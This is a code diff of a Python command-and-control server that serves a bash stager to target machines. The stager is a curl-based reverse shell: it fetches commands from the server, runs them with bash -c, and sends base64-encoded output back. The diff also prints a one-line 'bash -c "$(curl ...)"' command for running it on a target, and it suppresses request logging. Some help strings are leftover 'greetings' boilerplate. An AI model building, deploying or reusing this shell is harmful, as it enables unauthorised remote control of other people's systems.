@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import os
 import ssl
 import time
@@ -14,48 +14,34 @@ import coloredlogs
 
 logger = logging.getLogger(__name__)
 
-SHELLCODE_TEMPLATES = {
-    'CURL_ONLY': """#!/usr/bin/env bash
+SHELLCODE_TEMPLATE = """#!/usr/bin/env bash
+
 RUNNING=1
 COUNTER=0
-while [[ $RUNNING == 1 ]]; do   
-    CMD=$(curl -s "_SERVER_PROTOCOL_://_SERVER_IP_:_SERVER_PORT_/recv/" --raw --http0.9 2>/dev/null)
-    if [[ ${CMD} != "" ]]; then
-        if [[ ${CMDps} == "exit" ]]; then
-            RUNNING=0
-        else
-            sleep 0.125
-            DATA="$(bash -c "${CMD}" 2>&1 )"
-            curl -s -d ${DATA} "_SERVER_PROTOCOL_://_SERVER_IP_:_SERVER_PORT_/reply/${COUNTER}/" --raw --http0.9 2>/dev/null
-            COUNTER=$[$COUNTER +1]
-        fi
-    fi
-done""",
-    'CURL_BASE64': """#!/usr/bin/env bash
+
 if [ "$(uname)" == "Darwin" ]; then
     BASE64="base64"        
 elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
     BASE64="base64 -w0"
 fi
-RUNNING=1
-COUNTER=0
+
 while [[ $RUNNING == 1 ]]; do   
-    CMD=$(curl -s "http://_SERVER_IP_:_SERVER_PORT_/b64recv/" --raw --http0.9 2>/dev/null)
+    CMD=$(curl -s "_SERVER_PROTOCOL_://_SERVER_IP_:_SERVER_PORT_/recv/" --raw --http0.9 2>/dev/null)
+    
     if [[ ${CMD} != "" ]]; then
-        # echo "CMD = $CMD "
-        if [[ ${CMDps} == "exit" ]]; then
+        if [[ ${CMD} == "exit" ]]; then
             RUNNING=0
         else
+            echo "CMD = ${CMD}"
             sleep 0.125
-            # echo "http://{REV_IP}/reply/${COUNTER}/"
             DATA="$(bash -c "${CMD}" 2>&1 | ${BASE64} )"
-            # echo " ${DATA} "
-            curl -s -d ${DATA} "http://_SERVER_IP_:_SERVER_PORT_/b64reply/${COUNTER}/" --raw --http0.9 2>/dev/null
+            echo "B64DATA = ${DATA} "
+            curl -s -d ${DATA} "http://_SERVER_IP_:_SERVER_PORT_/reply/${COUNTER}/" --raw --http0.9 2>/dev/null
             COUNTER=$[$COUNTER +1]
         fi
     fi
-done"""
-}
+done
+"""
 
 
 def get_ip_addr() -> str:
@@ -103,10 +89,10 @@ def base64_command_encode(cmd):
 
 
 def prepare_shellcode(template, server, use_base64):
+    """Prepare shellcode by filling the template"""
     server_protocol, server_ip, server_port = server
-
     shellcode = template. \
-        replace('_SERVER_PROTO_', server_protocol). \
+        replace('_SERVER_PROTOCOL_', server_protocol). \
         replace('_SERVER_IP_', server_ip). \
         replace('_SERVER_PORT_', str(server_port))
 
@@ -116,57 +102,52 @@ def prepare_shellcode(template, server, use_base64):
 class ReqHandler(BaseHTTPRequestHandler):
 
     def __init__(self, server, cmd_queue, reply_queue, *args, **kwargs):
-        self.server_protocol, self.server_ip, self.server_port = self.server = server
+        self._server = server
+        self.server_protocol, self.server_ip, self.server_port = server
         self.cmd_queue, self.reply_queue = cmd_queue, reply_queue
         self.clients = {}
         super().__init__(*args, **kwargs)
+
+    def log_request(self, code):
+        # required to supress HTTP logging
+        pass
 
     def do_POST(self):
         logger.debug(f'[*] Received HTTP POST from {self.address_string()} path: {self.path}')
         content_length = int(self.headers['Content-Length'])
         logger.debug('[*] content_length = %i' % content_length)
-
-        post_data = self.rfile.read(content_length)
-        logger.debug(post_data.decode('utf-8'))
+        b64data = self.rfile.read(content_length)
+        post_data = base64.standard_b64decode(b64data).decode('utf-8')
+        logger.debug(post_data)
         items = self.path.split('/')
         action = items[1]
-        if action == 'shell':
+        if action == 'reply':
             self.reply_queue.put((self.address_string(), self.path, post_data))
 
     def do_GET(self):
         client_address = self.address_string()
         logger.debug(f'[*] Received HTTP GET from {self.address_string()} path: {self.path}')
-        if client_address not in self.clients:
-            self.clients[client_address] = 0
-
         items = self.path.split('/')
         action = items[1]
         if action == 'shell':
             logger.info(f'[*] Sending stager to: {client_address}')
-            self.send_reply(prepare_shellcode(SHELLCODE_TEMPLATES['CURL_ONLY'], self.server, False))
-
-        elif action == 'b64shell':
-            logger.info(f'[*] Sending base64 stager to: {client_address}')
-            self.send_reply(prepare_shellcode(SHELLCODE_TEMPLATES['CURL_BASE64'], self.server, True))
+            shellcode = prepare_shellcode(SHELLCODE_TEMPLATE, self._server, False)
+            # print(shellcode)
+            self.send_reply(shellcode)
 
         elif action == 'recv':
             cmd_item = self.cmd_queue.get()
             if cmd_item is not None:
                 logger.debug(f'[*] Sending command {cmd_item}')
-                self.send_reply(str(cmd_item))
-                self.cmd_queue.task_done()
-
-        elif action == 'b64recv':
-            cmd_item = self.cmd_queue.get()
-            if cmd_item is not None:
-                logger.debug(f'[*] Sending command {cmd_item}')
-                self.send_reply(str(base64.b64encode(cmd_item)))
+                # self.send_reply(str(base64.b64encode(cmd_item.encode('utf-8'))))
+                self.send_reply(cmd_item)
                 self.cmd_queue.task_done()
         else:
             self.send_reply('')
 
     def send_reply(self, data):
-        logger.debug(data)
+        if data is not None:
+            logger.debug(str(data))
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
@@ -185,11 +166,13 @@ def daemonize_function(func, value):
 
 class CurlShellServer(object):
 
-    def __init__(self, server_ip='0.0.0.0', server_port=8080, server_protocol='http'):
-        self.server = (server_protocol, server_ip, server_port)
-        self.server_protocol, self.server_ip, self.server_port = server_protocol, server_ip, server_port
-        self.server, self.http_thread, self.reply_thread, self.shell_thread = None, None, None, None
+    def __init__(self, server_ip='0.0.0.0', server_port=8080, cert=None):
+        self.server_protocol = 'http' if cert is None else 'https'
+        self.server = (self.server_protocol, server_ip, server_port)
+        self.server_ip, self.server_port = server_ip, server_port
+        self.http_thread, self.reply_thread, self.shell_thread = None, None, None
         self.cmd_queue, self.reply_queue = queue.Queue(), queue.Queue()
+        self.cmd_queue.put('id;uname')
 
     def shell_handler(self):
         """Shell commands handler"""
@@ -209,19 +192,19 @@ class CurlShellServer(object):
                 continue
 
             (ip, path, post_data) = reply_item
-            res = base64.b64decode(post_data).decode('utf-8')
-            print(res)
+            # res = base64.b64decode(post_data)
+            print(post_data)
 
     def run_web_server(self, daemonize=True, certfile=None):
         """Run HTTP(S) server"""
         logger.info(f'[+] Starting HTTP server @ {self.server_ip}:{self.server_port}')
         handler = functools.partial(ReqHandler, self.server, self.cmd_queue, self.reply_queue)
-        self.server = HTTPServer((self.server_ip, self.server_port), handler)
+        self._server = HTTPServer((self.server_ip, self.server_port), handler)
         if certfile is not None and os.path.exists(certfile):
             logger.info(f'Using certificate: {certfile}')
-            self.server.socket = ssl.wrap_socket(self.server.socket, certfile=certfile, server_side=True)
+            self._server.socket = ssl.wrap_socket(self._server.socket, certfile=certfile, server_side=True)
 
-        self.http_thread = daemonize_function(self.server.serve_forever, daemonize)
+        self.http_thread = daemonize_function(self._server.serve_forever, daemonize)
 
     def run_reply_handler(self, daemonize=True):
         """Run command execution result handler"""
@@ -233,16 +216,10 @@ class CurlShellServer(object):
 
     def show_usage(self):
         """Show usage commands"""
-        shellcode_cmd = \
-            f'Use following commands on target side:\n' \
-            f'curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/b64shell|base64 -d|sh\n' \
-            f'Mac OS X:' \
-            f'curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/b64shell|base64 -w0 -d|sh\n' \
-            f'bash -c "$(curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/shell/)\n"' \
-            f'Mac OS X:'\
-            f'bash -c "$(curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/shell/)\n"' \
-
-        print(shellcode_cmd)
+        print(
+            f'Execute following command on target host:\n\n'
+            f'bash -c "$(curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/shell/)"\n'
+        )
 
     def run(self):
         """Run all"""
@@ -253,18 +230,19 @@ class CurlShellServer(object):
 
 
 @click.command()
-@click.option('-i', '--ip', help='Number of greetings.')
+@click.option('-i', '--ip', required=True, help='Number of greetings.')
 @click.option('-p', '--port', default=8000, help='The person to greet.')
-@click.option('-c', '--ssl', "use_ssl", help='Certificate (server.pem)')
-def shcurl(ip, port, use_base64):
+@click.option('-c', '--cert', help='Certificate for HTTPS server (server.pem)')
+@click.option('-v', '--verbose', is_flag=True, help='More verbose output')
+def shcurl(ip, port, cert, verbose):
     """
     Simple program that greets NAME for a total of COUNT times.
     Use following command for certificate file generation:
     openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
     """
-    coloredlogs.install(level=logging.INFO, logger=logger)
-    # ip = get_ip_addr() if ip is None?
-    cs = CurlShellServer(ip, port, use_base64)
+    level = logging.DEBUG if verbose else logging.INFO
+    coloredlogs.install(level=level, logger=logger)
+    cs = CurlShellServer(ip, port, cert)
     cs.run()
 
 
